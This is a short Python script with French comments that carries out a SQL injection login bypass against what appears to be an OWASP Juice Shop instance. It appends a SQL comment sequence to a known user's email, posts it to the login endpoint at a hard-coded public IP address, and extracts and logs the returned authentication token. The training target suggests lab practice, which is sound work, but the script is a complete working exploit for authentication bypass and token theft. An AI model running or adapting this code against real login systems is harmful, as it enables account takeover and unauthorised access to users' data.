import requests
import logging

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    datefmt='%H:%M:%S'
)

def simulate_sql_injection(url, username):
    """
    Exécute une injection SQL basique dans le champ 'email' d'un endpoint d'authentification.
    
    :param url: L'URL de l'endpoint API à tester (ex: http://localhost:3000/rest/user/login).
    :param username: Le nom d'utilisateur dans lequel on injecte du SQL.
    :return: Le token d'authentification s'il existe, sinon None.
    """
    payload = f"{username}'--"
    logging.info(f"Lancement de l'injection SQL : email = {payload}")

    try:
        response = requests.post(url, data={'email': payload, 'password': 'password'})
        logging.info(f"Requête envoyée à : {url}")
        logging.info(f"Statut de la requête : {response.status_code}")

        logging.info(f"Réponse brute (extrait) : {response.text[:500]}")

        try:
            token = response.json().get("authentication", {}).get("token", None)
            if token:
                logging.info(f"Token récupéré : {token}")
                return token
            else:
                logging.info("Aucun token trouvé dans la réponse.")
                return None
        except ValueError:
            logging.error("La réponse n'est pas au format JSON. Impossible d'extraire le token.")
            return None

    except requests.RequestException as e:
       logging.error(f"Erreur lors de la requête : {e}")
       return None

if __name__ == "__main__":
    target_url = "http://45.76.47.218:3000/rest/user/login"
    username_input = "mc.safesearch@juice-sh.op"

    auth_token = simulate_sql_injection(target_url, username_input)
    if auth_token:
        logging.info("Injection SQL réussie, vous êtes probablement connecté.")
    else:
        logging.info("Injection SQL non concluante ou absence de token.")
